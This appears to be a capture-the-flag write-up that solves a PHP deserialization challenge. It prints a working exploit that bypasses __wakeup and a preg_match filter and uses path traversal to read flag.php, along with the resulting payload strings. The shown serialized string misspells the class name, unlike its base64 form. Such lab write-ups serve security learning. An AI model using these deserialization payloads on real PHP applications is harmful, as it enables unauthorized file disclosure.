# Homework 9-Bi AlcoFailic [100 points] (5 solves)

Source code:
```php
<?php
class Alcohol
{
    private $file = 'index.php';
    public function __construct($file)
    {
        $this->file = $file;
    }
    function __destruct()
    {
        echo @highlight_file($this->file, true);
    }

    function __wakeup()
    {
        if ($this->file != 'index.php') {
            $this->file = 'index.php';
        }
    }

}

if (isset($_GET['route'])) {
    $route = base64_decode($_GET['route']);
    if (preg_match('/[oc]:\d+:/i', $route)) {
        die('@#$%^&!*@(!');

    } else {
        @unserialize($route);
    }


} else {
    highlight_file('index.php');
}

?>
```
In this challenge, you have three things that need to work with.\
First, `__wakeup()` function, change the `1` to `2` to bypass the serialized object. 
Second, you need to bypass `preg_match`, which `/[oc]:\d+:/i` will match all phrase start with [o,c,O,C], follow with `:` and number, end with `:`. For this, simply add a `+` before the number.\
Last, even we finish our payload, the flag is still not shown since the `flag.php` is not in the current directory.

```php
<?php
class Alcohol
{
    private $file = "../../../../../flag.php";
}
$alcohol = new Alcohol();
$serialized = serialize($alcohol);
$serialized = str_replace('O:7','O:+7',$serialized);
$serialized = str_replace(':1:',':2:',$serialized);
echo $serialized;
echo " ";
echo base64_encode($serialized);
?>
```
Correct payload that output:
```text
O:+7:"Alcohol":2:{s:13:"%00Alocohol%00file";s:23:"../../../../../flag.php";}
TzorNzoiQWxjb2hvbCI6Mjp7czoxMzoiAEFsY29ob2wAZmlsZSI7czoyMzoiLi4vLi4vLi4vLi4vLi4vZmxhZy5waHAiO30=
```

Finally, we get the flag `hnci{!@#*@!#!@_1u_1v_O0tp1pi_P0y.......?}`, get the correct flag by using caesar cipher decoder with offset=24.

flag: `flag{!@#*@!#!@_1s_1t_M0rn1ng_N0w.......?}`
